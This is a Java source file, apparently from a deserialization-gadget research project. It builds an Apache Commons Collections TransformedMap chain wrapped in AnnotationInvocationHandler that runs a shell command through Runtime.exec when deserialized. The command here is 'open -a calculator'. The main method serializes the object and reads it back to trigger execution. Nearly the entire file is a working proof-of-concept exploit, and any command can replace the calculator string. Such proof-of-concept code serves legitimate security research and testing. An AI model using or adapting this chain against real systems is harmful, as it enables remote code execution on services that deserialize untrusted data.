package com.trganda.gadget.transformedmap;

import com.sun.org.glassfish.gmbal.AMXMetadata;
import com.trganda.gadget.utils.Reflections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class TransformedMapAnnotationExec {

    public static Object getObject() throws Exception {
        ChainedTransformer chainedTransformer =
                new ChainedTransformer(
                        new Transformer[] {
                            new ConstantTransformer(Runtime.class),
                            new InvokerTransformer(
                                    "getMethod",
                                    new Class[] {String.class, Class[].class},
                                    new Object[] {"getRuntime", new Class[0]}),
                            new InvokerTransformer(
                                    "invoke",
                                    new Class[] {Object.class, Object[].class},
                                    new Object[] {null, new Object[0]}),
                            new InvokerTransformer(
                                    "exec",
                                    new Class[] {String.class},
                                    new Object[] {"open -a calculator"})
                        });

        TransformedMap transformedMap =
                (TransformedMap) TransformedMap.decorate(new HashMap<>(), null, null);
        transformedMap.put("type", 1);

        InvocationHandler handler =
                (InvocationHandler)
                        Reflections.getFirstCtor(
                                        "sun.reflect.annotation.AnnotationInvocationHandler")
                                .newInstance(AMXMetadata.class, transformedMap);
        Reflections.setFieldValue(transformedMap, "valueTransformer", chainedTransformer);

        return handler;
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream oos =
                new ObjectOutputStream(
                        Files.newOutputStream(
                                Paths.get("target/TransformedMapAnnotationExec.bin")));
        oos.writeObject(getObject());

        ObjectInputStream ois =
                new ObjectInputStream(
                        Files.newInputStream(Paths.get("target/TransformedMapAnnotationExec.bin")));
        ois.readObject();
    }
}
